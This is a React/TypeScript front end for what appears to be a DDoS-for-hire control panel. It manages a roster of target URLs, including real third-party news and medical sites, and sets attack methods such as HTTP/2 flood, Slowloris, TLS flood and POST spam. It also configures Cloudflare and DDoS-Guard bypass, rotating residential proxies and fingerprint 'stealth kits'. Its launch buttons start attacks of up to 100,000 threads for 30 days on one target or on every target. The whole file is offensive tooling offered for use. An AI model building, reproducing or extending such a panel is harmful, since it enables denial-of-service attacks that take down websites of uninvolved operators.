import React, { useEffect, useState } from 'react';
import {
  Activity,
  Crosshair,
  PauseCircle,
  PlayCircle,
  PlusCircle,
  RefreshCw,
  ShieldCheck,
  Sparkles,
  Upload,
} from 'lucide-react';

interface Target {
  id: string;
  label: string;
  url: string;
  tags: string[];
  status: 'active' | 'inactive' | 'testing';
  last_tested: string;
  success_rate: number;
  attack_method?: string;
  engine?: string;
  proxy_profile?: string;
  stealth_profile?: string;
}

const Targets: React.FC = () => {
  const [targets, setTargets] = useState<Target[]>([]);
  const [newTarget, setNewTarget] = useState({
    label: '',
    url: '',
    tags: '',
    attack_method: 'post-spam',
    engine: 'playwright',
    proxy_profile: 'rotating',
    stealth_profile: 'medium',
  });
  const [bulkTargets, setBulkTargets] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [unlimitedMode, setUnlimitedMode] = useState(true);
  const [showBulkImport, setShowBulkImport] = useState(false);

  useEffect(() => {
    fetchTargets();
  }, []);

  const fetchTargets = async () => {
    try {
      const response = await fetch('/api/targets_endpoint.php?action=list');
      const data = await response.json();
      if (data.success && data.targets) {
        setTargets(data.targets);
      } else {
        setTargets([
          {
            id: 'target_1',
            label: 'Cloudflare-Protected-1',
            url: 'https://proverj.com/dr-shihirman/',
            tags: ['cloudflare', 'nginx'],
            status: 'active',
            last_tested: '2025-08-06T18:14:00Z',
            success_rate: 95.8,
            attack_method: 'bypassv2',
            engine: 'playwright',
            proxy_profile: 'rotating',
            stealth_profile: 'high',
          },
          {
            id: 'target_2',
            label: 'DDoS-Guard-Protected',
            url: 'https://life.ru/p/1643820',
            tags: ['ddos-guard', 'cdn'],
            status: 'active',
            last_tested: '2025-08-06T18:10:00Z',
            success_rate: 87.2,
            attack_method: 'auto-bypass',
            engine: 'headless',
            proxy_profile: 'residential',
            stealth_profile: 'extreme',
          },
          {
            id: 'target_3',
            label: 'API-Endpoint',
            url: 'https://httpbin.org/get',
            tags: ['api', 'test'],
            status: 'testing',
            last_tested: '2025-08-06T17:55:00Z',
            success_rate: 99.9,
            attack_method: 'http-spammer',
            engine: 'fetch',
            proxy_profile: 'datacenter',
            stealth_profile: 'low',
          },
        ]);
      }
      setIsLoading(false);
    } catch (error) {
      console.error('Failed to fetch targets:', error);
      setIsLoading(false);
    }
  };

  const handleStartAttack = async (groupId: string) => {
    try {
      const response = await fetch('/api/start_endpoint.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'start',
          group_id: groupId,
          profile_id: 'ramp-up',
          threads: unlimitedMode ? 100000 : 500,
          duration: unlimitedMode ? 2592000 : 3600,
          engine: 'auto-bypass',
          behavior_profile_id: 'high',
        }),
      });

      if (response.ok) {
        alert('Attack launched successfully!');
        fetchTargets();
      }
    } catch (error) {
      console.error('Failed to start attack:', error);
    }
  };

  const handleStopAttack = async (groupId: string) => {
    try {
      const response = await fetch('/api/stop_endpoint.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'stop',
          group_id: groupId,
        }),
      });

      if (response.ok) {
        alert('Attack stopped successfully!');
        fetchTargets();
      }
    } catch (error) {
      console.error('Failed to stop attack:', error);
    }
  };

  const handleAddTarget = async () => {
    try {
      const target = {
        label: newTarget.label,
        url: newTarget.url,
        tags: newTarget.tags.split(',').map((tag) => tag.trim()).filter(Boolean),
        attack_method: newTarget.attack_method,
        engine: newTarget.engine,
        proxy_profile: newTarget.proxy_profile,
        stealth_profile: newTarget.stealth_profile,
      };

      const response = await fetch('/api/targets_endpoint.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'add',
          target,
        }),
      });

      if (response.ok) {
        setNewTarget({
          label: '',
          url: '',
          tags: '',
          attack_method: 'post-spam',
          engine: 'playwright',
          proxy_profile: 'rotating',
          stealth_profile: 'medium',
        });
        fetchTargets();
      }
    } catch (error) {
      console.error('Failed to add target:', error);
    }
  };

  const handleBulkImport = async () => {
    try {
      const urls = bulkTargets
        .split('\n')
        .map((line) => line.trim())
        .filter((line) => line.length > 0);

      const targetsToImport = urls.map((url) => ({
        label: url.replace(/^https?:\/\//, '').split('/')[0],
        url,
        tags: ['imported', 'bulk'],
        attack_method: 'auto-bypass',
        engine: 'playwright',
        proxy_profile: 'rotating',
        stealth_profile: 'high',
      }));

      const response = await fetch('/api/targets_endpoint.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'import',
          targets: targetsToImport,
        }),
      });

      if (response.ok) {
        setBulkTargets('');
        setShowBulkImport(false);
        fetchTargets();
        alert(`Successfully imported ${targetsToImport.length} targets`);
      }
    } catch (error) {
      console.error('Failed to bulk import targets:', error);
    }
  };

  const handleStartAllAttacks = async () => {
    try {
      const response = await fetch('/api/group_runs_endpoint.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'start_group',
          targets: targets.map((t) => t.url),
          profile_id: 'ramp-up',
          threads: unlimitedMode ? 100000 : 500,
          duration: unlimitedMode ? 2592000 : 3600,
          engine: 'auto-bypass',
          behavior_profile_id: 'high',
        }),
      });

      if (response.ok) {
        const data = await response.json();
        alert(`Battle attack launched on all targets! Group ID: ${data.group_id}`);
      }
    } catch (error) {
      console.error('Failed to start group attack:', error);
    }
  };

  const handleStopAllAttacks = async () => {
    try {
      const response = await fetch('/api/group_runs_endpoint.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'stop_all',
        }),
      });

      if (response.ok) {
        alert('All attacks stopped successfully!');
        fetchTargets();
      }
    } catch (error) {
      console.error('Failed to stop all attacks:', error);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'active':
        return 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/30';
      case 'inactive':
        return 'bg-slate-500/10 text-slate-300 border border-slate-500/30';
      case 'testing':
        return 'bg-amber-500/10 text-amber-300 border border-amber-500/30';
      default:
        return 'bg-slate-500/10 text-slate-300 border border-slate-500/30';
    }
  };

  return (
    <div className="space-y-10 text-slate-100">
      <header className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
        <div>
          <div className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs uppercase tracking-[0.35em] text-slate-300">
            <Crosshair className="h-3.5 w-3.5 text-blue-300" />
            Target Operations
          </div>
          <h1 className="mt-4 text-3xl font-semibold text-white">Domain assault orchestration</h1>
          <p className="mt-2 max-w-2xl text-sm text-white/70">
            Coordinate and supervise every active domain from a single command board. Optimise proxy mixes, stealth
            profiles, and runtime escalation with a single action.
          </p>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={fetchTargets}
            className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-2 text-sm font-medium text-white transition hover:border-white/30"
          >
            <RefreshCw className="h-4 w-4" />
            Refresh
          </button>
          <button
            onClick={() => setShowBulkImport((prev) => !prev)}
            className="inline-flex items-center gap-2 rounded-full bg-blue-500/90 px-4 py-2 text-sm font-semibold text-white shadow-lg shadow-blue-500/25 transition hover:bg-blue-500"
          >
            <Upload className="h-4 w-4" />
            {showBulkImport ? 'Cancel Bulk Import' : 'Bulk Import'}
          </button>
        </div>
      </header>

      <section className="rounded-3xl border border-white/10 bg-slate-900/70 p-6 shadow-lg shadow-black/30">
        <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
          <div>
            <p className="text-xs uppercase tracking-[0.35em] text-blue-300/70">Battle mode</p>
            <h2 className="mt-2 text-2xl font-semibold text-white">Unlimited domain assault bands</h2>
            <p className="mt-2 text-sm text-white/70">
              Deploy thousands of threads across your entire domain roster with orchestrated escalation and automated
              mitigation countermeasures.
            </p>
          </div>
          <div className="flex items-center gap-3">
            <span
              className={`inline-flex items-center gap-2 rounded-full px-4 py-2 text-sm font-semibold ${
                unlimitedMode
                  ? 'bg-rose-500/10 text-rose-200 border border-rose-500/40'
                  : 'bg-blue-500/10 text-blue-200 border border-blue-500/40'
              }`}
            >
              <Sparkles className="h-4 w-4" />
              {unlimitedMode ? '⚡ Unlimited Mode' : 'Standard Mode'}
            </span>
            <button
              onClick={() => setUnlimitedMode((value) => !value)}
              className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-4 py-2 text-sm font-medium text-white transition hover:border-white/30"
            >
              Toggle Mode
            </button>
          </div>
        </div>
        <div className="mt-6 grid gap-4 md:grid-cols-2">
          <button
            onClick={handleStartAllAttacks}
            className="group flex items-center justify-between rounded-2xl border border-emerald-500/30 bg-emerald-500/10 px-5 py-4 text-left text-emerald-100 transition hover:border-emerald-400/60 hover:bg-emerald-500/15"
          >
            <div>
              <p className="text-sm font-semibold uppercase tracking-widest">Launch all targets</p>
              <p className="mt-1 text-xs text-emerald-100/80">Auto-balances proxies &amp; stealth kits per domain</p>
            </div>
            <PlayCircle className="h-8 w-8" />
          </button>
          <button
            onClick={handleStopAllAttacks}
            className="group flex items-center justify-between rounded-2xl border border-rose-500/30 bg-rose-500/10 px-5 py-4 text-left text-rose-100 transition hover:border-rose-400/60 hover:bg-rose-500/15"
          >
            <div>
              <p className="text-sm font-semibold uppercase tracking-widest">Cease all assaults</p>
              <p className="mt-1 text-xs text-rose-100/80">Gracefully winds down sessions and proxy leases</p>
            </div>
            <PauseCircle className="h-8 w-8" />
          </button>
        </div>
        <div className="mt-6 grid gap-4 md:grid-cols-3 text-xs text-white/70">
          <div className="rounded-2xl border border-blue-500/30 bg-blue-500/5 p-4">
            <p className="font-semibold text-blue-100">Proxy inventory</p>
            <p className="mt-1 text-blue-100/80">10M+ rotating &amp; residential endpoints with hygiene scoring.</p>
          </div>
          <div className="rounded-2xl border border-emerald-500/30 bg-emerald-500/5 p-4">
            <p className="font-semibold text-emerald-100">Stealth kits</p>
            <p className="mt-1 text-emerald-100/80">Fingerprint cloaking with TLS drift and device mimicry.</p>
          </div>
          <div className="rounded-2xl border border-indigo-500/30 bg-indigo-500/5 p-4">
            <p className="font-semibold text-indigo-100">Escalation playbooks</p>
            <p className="mt-1 text-indigo-100/80">HTTP/2 flood, Slowloris, TLS abuse &amp; behavioural swaps.</p>
          </div>
        </div>
      </section>

      {showBulkImport && (
        <section className="rounded-3xl border border-blue-500/30 bg-blue-500/10 p-6 text-blue-50 shadow-lg shadow-blue-500/20">
          <div className="flex items-start justify-between gap-4">
            <div>
              <h2 className="text-lg font-semibold">Bulk import targets</h2>
              <p className="mt-1 text-sm text-blue-100/80">Paste one URL per line. Each will be provisioned with auto-bypass.</p>
            </div>
            <button
              onClick={() => setShowBulkImport(false)}
              className="rounded-full border border-white/20 px-3 py-1 text-xs uppercase tracking-widest text-blue-100/80 hover:border-white/40"
            >
              Close
            </button>
          </div>
          <textarea
            value={bulkTargets}
            onChange={(e) => setBulkTargets(e.target.value)}
            className="mt-4 w-full rounded-2xl border border-white/20 bg-slate-950/60 p-4 text-sm text-blue-50 placeholder:text-blue-100/40 focus:border-white/40 focus:outline-none"
            placeholder={`https://example.com\nhttps://another-domain.net\nhttps://api.target.io`}
            rows={6}
          />
          <div className="mt-4 flex justify-end">
            <button
              onClick={handleBulkImport}
              className="inline-flex items-center gap-2 rounded-full bg-white/15 px-4 py-2 text-sm font-semibold text-white transition hover:bg-white/25"
            >
              <Upload className="h-4 w-4" />
              Import targets
            </button>
          </div>
        </section>
      )}

      <section className="rounded-3xl border border-white/10 bg-slate-900/70 p-6 shadow-lg shadow-black/30">
        <div className="flex flex-col gap-3 md:flex-row md:items-center md:justify-between">
          <div>
            <h2 className="text-2xl font-semibold text-white">Target roster</h2>
            <p className="text-sm text-white/70">Monitor live status, proxy blends, and stealth kits per domain.</p>
          </div>
          <div className="inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs uppercase tracking-widest text-white/70">
            <ShieldCheck className="h-3.5 w-3.5 text-emerald-300" />
            {targets.length} targets
          </div>
        </div>

        <div className="mt-6 grid gap-4 md:grid-cols-2 xl:grid-cols-3">
          {isLoading ? (
            <div className="col-span-full flex flex-col items-center justify-center gap-3 py-12 text-white/60">
              <span className="inline-block h-10 w-10 animate-spin rounded-full border-4 border-white/10 border-t-blue-400" />
              Loading targets...
            </div>
          ) : targets.length === 0 ? (
            <div className="col-span-full rounded-2xl border border-white/10 bg-slate-950/60 p-8 text-center text-white/60">
              <Activity className="mx-auto h-10 w-10 text-white/40" />
              <p className="mt-3 text-sm">No targets available. Add a domain to begin orchestration.</p>
            </div>
          ) : (
            targets.map((target) => (
              <div key={target.id} className="flex h-full flex-col gap-5 rounded-2xl border border-white/10 bg-slate-950/60 p-5 transition hover:border-white/20">
                <div className="flex items-start justify-between gap-3">
                  <div>
                    <p className="text-sm font-semibold text-white">{target.label}</p>
                    <a
                      href={target.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-xs text-blue-300 hover:text-blue-200"
                    >
                      {target.url}
                    </a>
                  </div>
                  <span className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs font-medium ${getStatusBadge(target.status)}`}>
                    <span className="h-1.5 w-1.5 rounded-full bg-current" />
                    {target.status.toUpperCase()}
                  </span>
                </div>

                <div className="flex flex-wrap gap-2 text-xs">
                  {target.tags.map((tag) => (
                    <span key={tag} className="rounded-full border border-blue-500/30 bg-blue-500/10 px-3 py-1 text-blue-100">
                      {tag}
                    </span>
                  ))}
                </div>

                <div className="grid gap-3 text-xs text-white/70">
                  <div className="flex items-center justify-between">
                    <span>Attack method</span>
                    <span className="font-semibold text-white/80">{target.attack_method}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Engine</span>
                    <span className="font-semibold text-white/80">{target.engine}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Proxy profile</span>
                    <span className="font-semibold text-white/80">{target.proxy_profile}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Stealth profile</span>
                    <span className="font-semibold text-white/80">{target.stealth_profile}</span>
                  </div>
                </div>

                <div>
                  <p className="text-xs uppercase tracking-widest text-white/60">Success rate</p>
                  <div className="mt-2 flex items-center gap-3">
                    <div className="h-2 w-full rounded-full bg-white/10">
                      <div
                        className={`h-full rounded-full ${
                          target.success_rate >= 90
                            ? 'bg-emerald-400'
                            : target.success_rate >= 70
                            ? 'bg-amber-400'
                            : 'bg-rose-400'
                        }`}
                        style={{ width: `${Math.min(target.success_rate, 100)}%` }}
                      />
                    </div>
                    <span className="text-sm font-semibold text-white">{target.success_rate}%</span>
                  </div>
                  <p className="mt-2 text-xs text-white/50">Last tested {new Date(target.last_tested).toLocaleString()}</p>
                </div>

                <div className="mt-auto flex flex-wrap gap-3">
                  <button
                    onClick={() => handleStartAttack(target.id)}
                    className="inline-flex flex-1 items-center justify-center gap-2 rounded-full border border-emerald-500/40 bg-emerald-500/10 px-4 py-2 text-sm font-semibold text-emerald-100 transition hover:border-emerald-400/60 hover:bg-emerald-500/15"
                  >
                    <PlayCircle className="h-4 w-4" />
                    Launch
                  </button>
                  <button
                    onClick={() => handleStopAttack(target.id)}
                    className="inline-flex flex-1 items-center justify-center gap-2 rounded-full border border-rose-500/40 bg-rose-500/10 px-4 py-2 text-sm font-semibold text-rose-100 transition hover:border-rose-400/60 hover:bg-rose-500/15"
                  >
                    <PauseCircle className="h-4 w-4" />
                    Cease
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      </section>

      <section className="rounded-3xl border border-white/10 bg-slate-900/70 p-6 shadow-lg shadow-black/30">
        <h2 className="text-lg font-semibold text-white">Add new target</h2>
        <p className="mt-1 text-sm text-white/70">Provision a fresh domain with default proxy and stealth profiles.</p>
        <div className="mt-6 grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">Label</label>
            <input
              type="text"
              value={newTarget.label}
              onChange={(e) => setNewTarget({ ...newTarget, label: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white placeholder:text-white/30 focus:border-white/30 focus:outline-none"
              placeholder="Target label"
            />
          </div>
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">URL</label>
            <input
              type="text"
              value={newTarget.url}
              onChange={(e) => setNewTarget({ ...newTarget, url: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white placeholder:text-white/30 focus:border-white/30 focus:outline-none"
              placeholder="https://example.com"
            />
          </div>
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">Tags</label>
            <input
              type="text"
              value={newTarget.tags}
              onChange={(e) => setNewTarget({ ...newTarget, tags: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white placeholder:text-white/30 focus:border-white/30 focus:outline-none"
              placeholder="tag1, tag2"
            />
          </div>
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">Attack method</label>
            <select
              value={newTarget.attack_method}
              onChange={(e) => setNewTarget({ ...newTarget, attack_method: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white focus:border-white/30 focus:outline-none"
            >
              <option value="auto-bypass">Auto Bypass</option>
              <option value="bypassv2">Bypass v2</option>
              <option value="post-spam">POST Spam</option>
              <option value="http-spammer">HTTP Spammer</option>
              <option value="head-flood">HEAD Flood</option>
              <option value="slowloris">Slowloris</option>
              <option value="tls-flood">TLS Flood</option>
              <option value="http2-flood">HTTP/2 Flood</option>
              <option value="crawl-drown">Crawl &amp; Drown</option>
            </select>
          </div>
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">Engine</label>
            <select
              value={newTarget.engine}
              onChange={(e) => setNewTarget({ ...newTarget, engine: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white focus:border-white/30 focus:outline-none"
            >
              <option value="playwright">Playwright</option>
              <option value="fetch">Fetch</option>
              <option value="headless">Headless</option>
              <option value="browser-mix">Browser Mix</option>
              <option value="raw-socket">Raw Socket</option>
            </select>
          </div>
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">Proxy profile</label>
            <select
              value={newTarget.proxy_profile}
              onChange={(e) => setNewTarget({ ...newTarget, proxy_profile: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white focus:border-white/30 focus:outline-none"
            >
              <option value="rotating">Rotating</option>
              <option value="residential">Residential</option>
              <option value="datacenter">Datacenter</option>
              <option value="mobile">Mobile</option>
              <option value="mixed">Mixed</option>
            </select>
          </div>
          <div className="flex flex-col gap-2">
            <label className="text-xs uppercase tracking-widest text-white/60">Stealth profile</label>
            <select
              value={newTarget.stealth_profile}
              onChange={(e) => setNewTarget({ ...newTarget, stealth_profile: e.target.value })}
              className="rounded-2xl border border-white/10 bg-slate-950/60 px-4 py-2 text-sm text-white focus:border-white/30 focus:outline-none"
            >
              <option value="low">Low</option>
              <option value="medium">Medium</option>
              <option value="high">High</option>
              <option value="extreme">Extreme</option>
            </select>
          </div>
        </div>
        <div className="mt-6 flex justify-end">
          <button
            onClick={handleAddTarget}
            className="inline-flex items-center gap-2 rounded-full bg-blue-500/90 px-4 py-2 text-sm font-semibold text-white shadow-lg shadow-blue-500/25 transition hover:bg-blue-500"
          >
            <PlusCircle className="h-4 w-4" />
            Add target
          </button>
        </div>
      </section>
    </div>
  );
};

export default Targets;
